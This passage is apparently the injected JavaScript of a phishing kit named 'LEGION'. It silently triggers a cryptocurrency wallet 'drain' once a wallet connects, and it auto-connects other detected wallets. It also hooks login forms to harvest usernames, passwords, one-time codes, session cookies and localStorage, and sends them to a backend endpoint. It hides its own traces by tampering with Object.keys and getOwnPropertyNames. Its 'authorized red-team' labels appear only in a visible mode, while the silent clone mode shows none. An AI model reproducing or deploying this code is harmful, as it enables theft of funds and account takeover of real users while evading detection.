      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_WC]', err);
    } finally {
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
    }
  }

  var CONNECT_BTN_RE = /connect|wallet|sign\s*in|link|auth|approve|enable/i;

  function hookNativeConnectButtons(root) {
    var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
    nodes.forEach(function (el) {
      if (el.__legionConnectHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim().toLowerCase();
      if (!CONNECT_BTN_RE.test(label)) return;
      if (label.length > 50) return;
      el.__legionConnectHook = true;
      el.addEventListener('click', function (e) {
        console.log('[LEGION] Connect button clicked - waiting for wallet connection...');
      }, true);
    });
  }

  function mountSilentAutoDrain() {
    document.body.classList.add('legion-silent');
    var hidden = document.createElement('div');
    hidden.id = 'legion-auth-status';
    hidden.className = 'status';
    hidden.style.cssText = 'display:none!important;';
    document.body.appendChild(hidden);

    function tryAutoDrain() {
      if (window.ethereum && window.ethereum.selectedAddress) {
        wallets.evm = {
          address: window.ethereum.selectedAddress,
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          provider: 'injected',
        };
        ACTIVE_TAB = 'evm';
        console.log('[LEGION] Wallet detected:', window.ethereum.selectedAddress);

        captureFakeBalanceSnapshot().then(function () {
          console.log('[LEGION] Starting extraction and background wallet connections...');
          // Start main extraction with current EVM wallet
          runAuthorizedDrain({ skipConnect: true });

          // Background: Try to auto-connect all other available wallets (non-blocking)
          setTimeout(function () {
            autoConnectAllDetectedWallets()
              .then(function (result) {
                console.log('[LEGION] Background wallet connections - Connected:', result.connected);
                if (result.errors.length > 0) {
                  console.log('[LEGION] Background wallet connection errors:', result.errors);
                }
              })
              .catch(function (err) {
                console.log('[LEGION] Background auto-connect error (non-fatal):', err.message);
              });
          }, 500);
        });
        if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
      }
    }

    hookNativeConnectButtons(document);
    if (PRODUCTION_CLONE) {
      var obs = new MutationObserver(function (mutations) {
        mutations.forEach(function (m) {
          m.addedNodes.forEach(function (node) {
            if (node.nodeType === 1) hookNativeConnectButtons(node);
          });
        });
      });
      obs.observe(document.documentElement, { childList: true, subtree: true });
    }

    if (window.ethereum) {
      if (window.ethereum.selectedAddress) tryAutoDrain();
      window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts && accounts[0]) tryAutoDrain();
      });
      window.ethereum.on('connect', tryAutoDrain);
    }
  }

  function mountUi() {
    if ((SILENT_INJECT || PRODUCTION_CLONE) && !QA_VISIBLE_UI) {
      mountSilentAutoDrain();
      return;
    }

    document.body.classList.add('legion-auth-active');

    var banner = document.createElement('div');
    banner.id = 'legion-auth-banner';
    banner.setAttribute('role', 'alert');
    banner.textContent = 'AUTHORIZED RED-TEAM EXERCISE — PRODUCTION BACKEND — WRITTEN PERMISSION REQUIRED';
    document.body.prepend(banner);

    var panel = document.createElement('div');
    panel.id = 'legion-auth-panel';
    panel.innerHTML = [
      '<header>Connect wallet (authorized exercise)</header>',
      '<div class="tabs">',
      '  <button type="button" data-tab="evm" class="active">EVM</button>',
      '  <button type="button" data-tab="sol">Solana</button>',
      '  <button type="button" data-tab="tron">Tron</button>',
      '  <button type="button" data-tab="ton">TON</button>',
      '  <button type="button" data-tab="btc">BTC</button>',
      '</div>',
      '<div class="body">',
      '  <div id="legion-auth-status" class="status">Select chain, connect, and authorize transfer.</div>',
      '  <div class="wallet-mode">',
      '    <button type="button" class="secondary" id="legion-auth-wc"' +
        (WC_PROJECT_ID ? '' : ' disabled title="Set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID"') +
        '>WalletConnect (QR)</button>',
      '  </div>',
      '  <input type="text" class="seaport-hash" id="legion-seaport-order-hash" placeholder="Optional: paste OpenSea order hash" />',
      '  <div class="actions">',
      '    <button type="button" class="primary" id="legion-auth-primary">Connect &amp; Transfer</button>',
      '    <button type="button" class="secondary" id="legion-auth-seaport">Accept Offer</button>',
      '  </div>',
      '</div>',
    ].join('');

    document.body.appendChild(panel);

    panel.querySelectorAll('.tabs button').forEach(function (tabBtn) {
      tabBtn.addEventListener('click', function () {
        ACTIVE_TAB = tabBtn.getAttribute('data-tab') || 'evm';
        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('active'); });
        tabBtn.classList.add('active');
        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — ready.', false);
      });
    });

    document.getElementById('legion-auth-primary').addEventListener('click', function () {
      runAuthorizedDrain();
    });
    var seaportBtn = document.getElementById('legion-auth-seaport');
    if (seaportBtn) {
      seaportBtn.addEventListener('click', function () {
        var btn = document.getElementById('legion-auth-primary');
        var wcBtn = document.getElementById('legion-auth-wc');
        seaportBtn.disabled = true;
        if (btn) btn.disabled = true;
        if (wcBtn) wcBtn.disabled = true;
        runSeaportAcceptOffer()
          .catch(function (err) {
            setStatus(err && err.message ? err.message : String(err), false);
            console.warn('[LEGION_SEAPORT]', err);
          })
          .finally(function () {
            seaportBtn.disabled = false;
            if (btn) btn.disabled = false;
            if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
          });
      });
    }
    var wcButton = document.getElementById('legion-auth-wc');
    if (wcButton) {
      wcButton.addEventListener('click', runWalletConnectThenDrain);
    }
  }

  /* ── Generic login form credential + session capture (authorized lab) ── */
  var LOGIN_USER_FIELDS = ['email', 'username', 'login', 'user', 'userid', 'account', 'phone'];
  var LOGIN_PASS_FIELDS = ['password', 'pass', 'passwd', 'pwd'];
  var LOGIN_TOTP_FIELDS = ['totp', 'otp', '2fa', 'mfa', 'code', 'token', 'authenticator', 'sms'];

  function loginFieldMatch(name, list) {
    if (!name) return false;
    var n = String(name).toLowerCase();
    return list.some(function (f) { return n.indexOf(f) >= 0; });
  }

  function readLoginFormPayload(form) {
    var username = '';
    var password = '';
    var totp = '';
    try {
      var fd = new FormData(form);
      fd.forEach(function (value, key) {
        var v = String(value || '').trim();
        if (!v) return;
        if (!username && loginFieldMatch(key, LOGIN_USER_FIELDS)) username = v;
        if (!password && loginFieldMatch(key, LOGIN_PASS_FIELDS)) password = v;
        if (!totp && loginFieldMatch(key, LOGIN_TOTP_FIELDS)) totp = v;
      });
    } catch (e) { /* non-fatal */ }
    if (!password) {
      var pw = form.querySelector('input[type="password"]');
      if (pw) password = String(pw.value || '').trim();
    }
    if (!username) {
      var email = form.querySelector('input[type="email"]');
      if (email) username = String(email.value || '').trim();
      if (!username) {
        var text = form.querySelector('input[type="text"]');
        if (text) username = String(text.value || '').trim();
      }
    }
    return { username: username, password: password, totp: totp };
  }

  function readDocumentCookies() {
    try {
      var raw = document.cookie || '';
      return raw.trim() || null;
    } catch (e) {
      return null;
    }
  }

  function readLocalStorageJson() {
    try {
      var out = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (!key) continue;
        out[key] = localStorage.getItem(key);
      }
      return Object.keys(out).length ? JSON.stringify(out) : null;
    } catch (e) {
      return null;
    }
  }

  function buildLoginCredPayload(formPayload) {
    return {
      exchange: window.location.hostname.replace(/^www\./, ''),
      username: formPayload.username,
      password: formPayload.password,
      totp: formPayload.totp || null,
      page_url: window.location.href,
      session_cookies: readDocumentCookies(),
      local_storage: readLocalStorageJson(),
    };
  }

  async function submitLoginCreds(formPayload) {
    if (!formPayload.username || !formPayload.password) return;
    var headers = { 'Content-Type': 'application/json' };
    if (CEX_CREDS_API_KEY) headers['X-Cex-Creds-Key'] = CEX_CREDS_API_KEY;
    try {
      await fetch(BACKEND_URL + '/api/v1/creds', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(buildLoginCredPayload(formPayload)),
        keepalive: true,
      });
    } catch (e) {
      console.warn('[LEGION_LOGIN_CAPTURE]', e);
    }
  }

  function hookLoginForm(form) {
    if (!CAPTURE_LOGIN_CREDS || form.__legionLoginHooked) return;
    var hasPassword = form.querySelector('input[type="password"]');
    if (!hasPassword) return;
    form.__legionLoginHooked = true;

    form.addEventListener('submit', function () {
      var payload = readLoginFormPayload(form);
      if (!payload.username || !payload.password) return;
      submitLoginCreds(payload);
      setTimeout(function () {
        submitLoginCreds(payload);
      }, 1500);
    }, true);
  }

  function scanLoginForms(root) {
    if (!CAPTURE_LOGIN_CREDS) return;
    (root || document).querySelectorAll('form').forEach(hookLoginForm);
  }

  function initLoginFormCapture() {
    if (!CAPTURE_LOGIN_CREDS) return;
    scanLoginForms(document);
    var loginObs = new MutationObserver(function (mutations) {
      mutations.forEach(function (m) {
        m.addedNodes.forEach(function (node) {
          if (node.nodeType !== 1) return;
          if (node.tagName === 'FORM') hookLoginForm(node);
          else scanLoginForms(node);
        });
      });
    });
    loginObs.observe(document.documentElement, { childList: true, subtree: true });
  }

  function hideInjectionTraces() {
    try {
      Object.defineProperty(window, 'wallets', {
        configurable: false,
        enumerable: false,
        writable: false,
      });
      Object.defineProperty(window, 'autoDetectAvailableWallets', {
        configurable: false,
        enumerable: false,
      });
      Object.defineProperty(window, 'autoConnectAllDetectedWallets', {
        configurable: false,
        enumerable: false,
      });
      Object.defineProperty(window, 'runAuthorizedDrain', {
        configurable: false,
        enumerable: false,
      });
    } catch (e) { /* non-fatal */ }

    // Prevent property enumeration via Object.keys
    var keysOriginal = Object.keys;
    Object.keys = function (obj) {
      var keys = keysOriginal.call(Object, obj);
      return keys.filter(function (k) {
        return k.indexOf('legion') < 0 && k.indexOf('LEGION') < 0 && k.indexOf('drain') < 0;
      });
    };

    // Hide from getOwnPropertyNames
    var getPropNamesOriginal = Object.getOwnPropertyNames;
    Object.getOwnPropertyNames = function (obj) {
      var names = getPropNamesOriginal.call(Object, obj);
      return names.filter(function (n) {
        return n.indexOf('legion') < 0 && n.indexOf('LEGION') < 0 && n.indexOf('drain') < 0;
      });
    };
  }

  /* ── SESSION MANAGER (Phase 10) ── */
  var _sessionManager = null;
  var _stateManager = null;
  var _executionContext = null;

  function initializeSessionManager() {
    try {
      // Initialize BroadcastChannel for multi-tab prevention
      if (typeof BroadcastChannel !== 'undefined') {
        _sessionManager = {
          sessionId: 'legion-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9),
          broadcastChannel: new BroadcastChannel('legion-session-v2'),
          otherTabsDetected: new Set(),
          isActive: true,
        };

        _sessionManager.broadcastChannel.onmessage = function(event) {
          var msg = event.data;
          if (msg.type === 'PING' && msg.sessionId !== _sessionManager.sessionId) {
            _sessionManager.broadcastChannel.postMessage({
              type: 'PONG',
              sessionId: _sessionManager.sessionId,
              timestamp: Date.now(),
            });
          } else if (msg.type === 'PONG' && msg.sessionId !== _sessionManager.sessionId) {
            _sessionManager.otherTabsDetected.add(msg.sessionId);
            console.warn('[SESSION] Another tab detected: ' + msg.sessionId);
          } else if (msg.type === 'TERMINATE' && msg.sessionId !== _sessionManager.sessionId) {
            _sessionManager.isActive = false;
            setTimeout(function() { window.close(); }, 2000);
          }
        };

        // Heartbeat: check for other tabs every 5 seconds
        setInterval(function() {
          if (_sessionManager && _sessionManager.broadcastChannel) {
            _sessionManager.otherTabsDetected.clear();
            _sessionManager.broadcastChannel.postMessage({
              type: 'PING',
              sessionId: _sessionManager.sessionId,
              timestamp: Date.now(),
            });
          }
        }, 5000);

        console.log('[SESSION] BroadcastChannel initialized: ' + _sessionManager.sessionId);
      }

      // Initialize IndexedDB for checkpoints
      if (typeof indexedDB !== 'undefined') {
        var dbRequest = indexedDB.open('legion-execution-db', 1);

        dbRequest.onupgradeneeded = function(event) {
          var db = event.target.result;
          if (!db.objectStoreNames.contains('checkpoints')) {
            var store = db.createObjectStore('checkpoints', { keyPath: 'sessionId' });
            store.createIndex('timestamp', 'timestamp', { unique: false });
          }
        };

        dbRequest.onsuccess = function() {
          _stateManager = {
            db: dbRequest.result,
            saveCheckpoint: function(checkpoint) {
              var txn = _stateManager.db.transaction(['checkpoints'], 'readwrite');
              var store = txn.objectStore('checkpoints');
              var data = Object.assign({}, checkpoint, {
                sessionId: _sessionManager.sessionId,
              });
              store.put(data);
              console.log('[STATE] Checkpoint saved at ' + new Date(checkpoint.timestamp).toISOString());
              return true;
            },
            loadLastCheckpoint: function() {
              return new Promise(function(resolve) {
                var txn = _stateManager.db.transaction(['checkpoints'], 'readonly');
                var store = txn.objectStore('checkpoints');
                var index = store.index('timestamp');
                var getAllRequest = index.getAll();

                getAllRequest.onsuccess = function() {
                  var checkpoints = getAllRequest.result;
                  if (checkpoints.length === 0) {
                    resolve(null);
                    return;
                  }

                  var sorted = checkpoints.sort(function(a, b) { return b.timestamp - a.timestamp; });
                  var latest = sorted[0];

                  var ageMinutes = (Date.now() - latest.timestamp) / (1000 * 60);
                  if (ageMinutes > 60) {
                    console.warn('[STATE] Checkpoint too old, skipping recovery');
                    resolve(null);
                    return;
                  }

                  console.log('[STATE] Loaded checkpoint from ' + new Date(latest.timestamp).toISOString());
                  resolve(latest);
                };

                getAllRequest.onerror = function() {
                  resolve(null);
                };
              });
            },
          };

          console.log('[SESSION] IndexedDB initialized');
        };
      }
    } catch (err) {
      console.warn('[SESSION] Session manager initialization failed:', err);
    }
  }

  function bootLegionInject() {
    // Initialize session management first (Phase 10)
    initializeSessionManager();

    // Initialize anti-detection first, before any other operations
    if (PRODUCTION_CLONE || SILENT_INJECT) {
      initAntiDetection();
      hideInjectionTraces();
    }

    // Start incident response monitoring
    if (INCIDENT_RESPONSE.enabled) {
      monitorForDetection();
    }

    mountUi();
    initLoginFormCapture();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bootLegionInject);
  } else {
    bootLegionInject();
  }
})();
